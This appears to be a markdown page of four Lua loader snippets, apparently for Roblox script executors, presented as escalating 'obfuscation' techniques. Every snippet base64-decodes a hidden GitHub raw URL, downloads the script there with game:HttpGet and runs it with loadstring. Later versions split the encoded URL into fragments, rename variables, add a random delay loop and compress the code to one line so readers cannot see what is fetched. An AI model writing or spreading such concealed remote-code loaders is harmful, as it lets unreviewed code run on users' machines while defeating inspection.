# Obfuscated

```
local base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

local function decodeBase64(data)
local decoded = ""
local padding = #data % 4
if padding > 0 then
data = data .. string.rep("=", 4 - padding)
end
data = string.gsub(data, ".", function(x)
if x == "=" then return "" end
local r, f = "", (string.find(base64, x) - 1)
for i = 6, 1, -1 do
r = r .. (math.floor(f / 2^(i-1)) % 2)
end
return r
end)
for i = 1, #data, 8 do
decoded = decoded .. string.char(tonumber(string.sub(data, i, i+7), 2))
end
return decoded
end

local encodedUrl = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05vdEg0eG9yLy0vbWFpbi8lMkM="
local decodedUrl = decodeBase64(encodedUrl)

loadstring(game:HttpGet(decodedUrl))()
```

# New Method Obfuscated

```
-- Never Touch This
local _1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

-- You can move this
local _e = game.HttpGet

-- function to decode base64 string
local function _2(_3)
    local _4 = ""
    local _5 = #_3 % 4
    if _5 > 0 then
        _3 = _3 .. string.rep("=", 4 - _5)
    end
    _3 = string.gsub(_3, ".", function(_6)
        if _6 == "=" then return "" end
        local _7, _8 = "", (string.find(_1, _6) - 1)
        for _9 = 6, 1, -1 do
            _7 = _7 .. (math.floor(_8 / 2^(_9-1)) % 2)
        end
        return _7
    end)
    for _10 = 1, #_3, 8 do
        _4 = _4 .. string.char(tonumber(string.sub(_3, _10, _10+7), 2))
    end
    return _4
end

-- base64 string to be decoded; can move this assignment around
local _a = {"aHR0c", "HM6Ly9", "yYXcuZ", "2l0aHV", "idXNlcm", "NvbnRl", "bnQuY2", "9tL05v", "dEg0eG", "9yLy0v", "bWFpbi", "8lMkM="}

-- function to concatenate table; can move this function around
local _b = function(_c) return table.concat(_c) end

-- decoded base64 string
local _11 = _b(_a)

-- this function can be placed elsewhere
local function _d() return loadstring end
local _d = _d()

-- references to game and HttpGet; can move these assignments around
local _f = _e
local _g = game

-- final encoded string to be used in HttpGet call
local _12 = _2(_11)

-- function call to execute the fetched script
_d(_f(_g, _12))()
```

# For ,,
```
local _1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

local _e = game.HttpGet

local function _2(_3)
    local _4 = ""
    local _5 = #_3 % 4
    if _5 > 0 then
        _3 = _3 .. string.rep("=", 4 - _5)
    end
    _3 = string.gsub(_3, ".", function(_6)
        if _6 == "=" then return "" end
        local _7, _8 = "", (string.find(_1, _6) - 1)
        for _9 = 6, 1, -1 do
            _7 = _7 .. (math.floor(_8 / 2^(_9-1)) % 2)
        end
        return _7
    end)
    for _10 = 1, #_3, 8 do
        _4 = _4 .. string.char(tonumber(string.sub(_3, _10, _10+7), 2))
    end
    return _4
end

local _a = {"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05vdEg0eG9yLy0vcmVmcy9oZWFkcy9tYWluLyUyQyUyQw=="}

local _b = function(_c) return table.concat(_c) end

local _11 = _b(_a)

local function _d() return loadstring end
local _d = _d()

local _f = _e
local _g = game

local _12 = _2(_11)

_d(_f(_g, _12))()
```


# Ultra Obfuscation
```
local executed=false while not executed do if math.random(0,1)==0 then local _=974 else executed =true end end local _1="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" local _e=game.HttpGet local function _2(_3) local _4="" local _5=#_3%4 if _5>0 then _3=_3..string.rep("=",4-_5) end _3=string.gsub(_3,".",function(_6) if _6=="=" then return "" end local _7,_8="",(string.find(_1,_6)-1) for _9=6,1,-1 do _7=_7..(math.floor(_8/2^(_9-1))%2) end return _7 end) for _10=1,#_3,8 do _4=_4..string.char(tonumber(string.sub(_3,_10,_10+7),2)) end return _4 end local _a={"aHR0c","HM6Ly9","yYXcuZ","2l0aHV","idXNlcm","NvbnRl","bnQuY2","9tL05v","dEg0eG","9yLy0v","bWFpbi","8lMkM="} local _b=function(_c) return table.concat(_c) end local _11=_b(_a) local function _d() return loadstring end local _d=_d() local _f=_e local _g=game local _12=_2(_11) _d(_f(_g,_12))()
```
